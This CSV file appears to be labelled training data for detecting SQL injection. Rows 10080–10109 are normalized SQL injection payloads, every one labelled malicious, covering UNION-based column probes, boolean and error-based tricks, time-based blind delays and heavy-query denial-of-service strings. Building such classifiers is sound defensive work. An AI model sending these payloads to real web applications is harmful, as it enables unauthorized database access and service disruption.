row_index,payload_norm,label,sqli_type_hint
10080,-5708 where 3134 = 3134 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,1,
10081,"1 ) and make_set ( 8403 = 8403,8899 )",1,
10082,"-7869%' union all select 2406,2406,2406,2406,2406,2406,2406,2406#",1,
10083,"1"" ) ) as xbhp where 7527 = 7527",1,
10084,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ""eaqk"" = ""eaqk",1,
10085,-2783%' ) ) or 4144 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4144 = 4144 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( '%' = ',1,
10086,"-4135' ) ) ) union all select 4413,4413,4413#",1,
10087,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( '%' = '",1,
10088,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( 'pags' = 'pags,1,
10089,"1'+ ( select kgon where 9014 = 9014 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) ) +'",1,
10090,select pg_sleep ( 5 ) and 'qfaz' like 'qfaz,1,
10091,1 ) as ptxw where 9873 = 9873,1,
10092,"1%"" ) union all select null,null--",1,
10093,"-2430' ) union all select 5712,5712,5712,5712,5712,5712,5712,5712,5712,5712--",1,
10094,1'|| ( select 'jslz' where 8405 = 8405 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) ) ||',1,
10095,"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( 7244 = 7244",1,
10096,1 ) ) ) and 4595 = 4595#,1,
10097,1' and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ),1,
10098,"1"" ) where 9093 = 9093",1,
10099,"1 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 )",1,
10100,-2055 ) or 3038 = 3038,1,
10101,"1'+ ( select 'suzs' where 2905 = 2905 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) +'",1,
10102,select ( case when ( 4769 = 4769 ) then 4769 else 4769* ( select 4769 from mysql.db ) end ) #,1,
10103,"1' ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( 'cpoy' = 'cpoy",1,
10104,"1"" ) as eoer where 8667 = 8667 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --",1,
10105,"select pg_sleep ( 5 ) and ( ( ""%"" = """,1,
10106,"1"" ) ) ) and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
10107,1'|| ( select 'irfn' where 8360 = 8360,1,
10108,"1%"" ) ) ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ( ""%"" = """,1,
10109,"-5840' ) or elt ( 1032 = 1032,3623 )",1,
